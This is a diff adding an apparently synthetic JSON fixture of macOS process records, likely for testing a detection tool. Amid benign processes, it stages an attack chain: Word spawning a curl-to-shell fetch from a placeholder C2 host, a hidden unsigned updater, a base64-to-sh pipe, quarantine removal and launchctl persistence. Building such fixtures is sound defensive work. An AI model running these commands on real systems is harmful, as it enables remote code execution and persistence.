@@ -1,0 +1,240 @@
+{
+  "collected_at": "2026-03-10T14:30:00.000000Z",
+  "records": [
+    {
+      "cmdline": "/sbin/launchd",
+      "codesign": {
+        "identifier": "com.apple.synthetic",
+        "status": "signed",
+        "team_id": null
+      },
+      "name": "launchd",
+      "path": "/sbin/launchd",
+      "pid": 1,
+      "ppid": 0,
+      "start_time": "2026-03-01T08:00:05.000000Z",
+      "user": "root"
+    },
+    {
+      "codesign": {
+        "identifier": "com.apple.synthetic",
+        "status": "signed",
+        "team_id": null
+      },
+      "name": "WindowServer",
+      "path": "/System/Library/PrivateFrameworks/SkyLight.framework/Resources/WindowServer",
+      "pid": 101,
+      "ppid": 1,
+      "start_time": "2026-03-01T08:00:05.000000Z",
+      "user": "root"
+    },
+    {
+      "codesign": {
+        "identifier": "com.apple.synthetic",
+        "status": "signed",
+        "team_id": null
+      },
+      "name": "Finder",
+      "path": "/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder",
+      "pid": 350,
+      "ppid": 1,
+      "start_time": "2026-03-01T08:06:00.000000Z",
+      "user": "alice"
+    },
+    {
+      "codesign": {
+        "identifier": "com.apple.synthetic",
+        "status": "signed",
+        "team_id": null
+      },
+      "name": "Safari",
+      "path": "/Applications/Safari.app/Contents/MacOS/Safari",
+      "pid": 400,
+      "ppid": 1,
+      "start_time": "2026-03-10T09:00:00.000000Z",
+      "user": "alice"
+    },
+    {
+      "codesign": {
+        "identifier": "com.apple.synthetic",
+        "status": "signed",
+        "team_id": null
+      },
+      "name": "Terminal",
+      "path": "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal",
+      "pid": 410,
+      "ppid": 1,
+      "start_time": "2026-03-10T09:30:00.000000Z",
+      "user": "alice"
+    },
+    {
+      "cmdline": "-zsh",
+      "codesign": {
+        "identifier": "com.apple.synthetic",
+        "status": "signed",
+        "team_id": null
+      },
+      "name": "zsh",
+      "path": "/bin/zsh",
+      "pid": 411,
+      "ppid": 410,
+      "start_time": "2026-03-10T09:30:01.000000Z",
+      "user": "alice"
+    },
+    {
+      "cmdline": "python3 /Users/alice/dev/analysis.py",
+      "codesign": {
+        "identifier": "python3",
+        "status": "adhoc",
+        "team_id": null
+      },
+      "name": "python3",
+      "path": "/opt/homebrew/bin/python3",
+      "pid": 412,
+      "ppid": 411,
+      "start_time": "2026-03-10T09:40:00.000000Z",
+      "user": "alice"
+    },
+    {
+      "codesign": {
+        "identifier": "us.zoom.xos",
+        "status": "signed",
+        "team_id": "SYNTH12345"
+      },
+      "name": "zoom.us",
+      "path": "/private/var/folders/ab/cd/T/AppTranslocation/9F1C2B3A-0000-4000-8000-000000000001/d/zoom.us.app/Contents/MacOS/zoom.us",
+      "pid": 420,
+      "ppid": 1,
+      "start_time": "2026-03-10T10:00:00.000000Z",
+      "user": "alice"
+    },
+    {
+      "codesign": {
+        "identifier": "com.microsoft.Word",
+        "status": "signed",
+        "team_id": "UBF8T346G9"
+      },
+      "name": "Microsoft Word",
+      "path": "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word",
+      "pid": 500,
+      "ppid": 1,
+      "start_time": "2026-03-10T14:00:00.000000Z",
+      "user": "alice"
+    },
+    {
+      "cmdline": "sh -c curl -s http://c2.malicious.example.test/stage.sh | sh",
+      "codesign": {
+        "identifier": "com.apple.synthetic",
+        "status": "signed",
+        "team_id": null
+      },
+      "name": "sh",
+      "path": "/bin/sh",
+      "pid": 501,
+      "ppid": 500,
+      "start_time": "2026-03-10T14:01:10.000000Z",
+      "user": "alice"
+    },
+    {
+      "cmdline": "curl -s http://c2.malicious.example.test/stage.sh",
+      "codesign": {
+        "identifier": "com.apple.synthetic",
+        "status": "signed",
+        "team_id": null
+      },
+      "name": "curl",
+      "path": "/usr/bin/curl",
+      "pid": 502,
+      "ppid": 501,
+      "start_time": "2026-03-10T14:01:11.000000Z",
+      "user": "alice"
+    },
+    {
+      "cmdline": "/private/tmp/.updater --password=SyntheticSecret123",
+      "codesign": {
+        "identifier": null,
+        "status": "unsigned",
+        "team_id": null
+      },
+      "name": ".updater",
+      "path": "/private/tmp/.updater",
+      "pid": 503,
+      "ppid": 1,
+      "sha256": "e35e17e932059ca07b1436091b5ca79569134f0e3ff10f83d9bc0a74a032accf",
+      "start_time": "2026-03-10T14:01:20.000000Z",
+      "user": "alice"
+    },
+    {
+      "cmdline": "python3 /Users/Shared/run.py --token=abc123synthetic",
+      "codesign": {
+        "identifier": "python3",
+        "status": "adhoc",
+        "team_id": null
+      },
+      "name": "python3",
+      "path": "/opt/homebrew/bin/python3",
+      "pid": 504,
+      "ppid": 411,
+      "start_time": "2026-03-10T14:05:00.000000Z",
+      "user": "alice"
+    },
+    {
+      "cmdline": "osascript -e do shell script \"id\" with administrator privileges",
+      "codesign": {
+        "identifier": "com.apple.synthetic",
+        "status": "signed",
+        "team_id": null
+      },
+      "name": "osascript",
+      "path": "/usr/bin/osascript",
+      "pid": 505,
+      "ppid": 411,
+      "start_time": "2026-03-10T14:06:00.000000Z",
+      "user": "alice"
+    },
+    {
+      "cmdline": "bash -c echo ZWNobyBoaQ== | base64 -D | sh",
+      "codesign": {
+        "identifier": "com.apple.synthetic",
+        "status": "signed",
+        "team_id": null
+      },
+      "name": "bash",
+      "path": "/bin/bash",
+      "pid": 506,
+      "ppid": 411,
+      "start_time": "2026-03-10T14:07:00.000000Z",
+      "user": "alice"
+    },
+    {
+      "cmdline": "xattr -d com.apple.quarantine /Users/alice/Downloads/Installer.app",
+      "codesign": {
+        "identifier": "com.apple.synthetic",
+        "status": "signed",
+        "team_id": null
+      },
+      "name": "xattr",
+      "path": "/usr/bin/xattr",
+      "pid": 507,
+      "ppid": 411,
+      "start_time": "2026-03-10T14:08:00.000000Z",
+      "user": "alice"
+    },
+    {
+      "cmdline": "launchctl load /private/tmp/com.example.updater.plist",
+      "codesign": {
+        "identifier": "com.apple.synthetic",
+        "status": "signed",
+        "team_id": null
+      },
+      "name": "launchctl",
+      "path": "/bin/launchctl",
+      "pid": 508,
+      "ppid": 411,
+      "start_time": "2026-03-10T14:09:00.000000Z",
+      "user": "alice"
+    }
+  ],
+  "schema_version": 1,
+  "source": "process"
+}
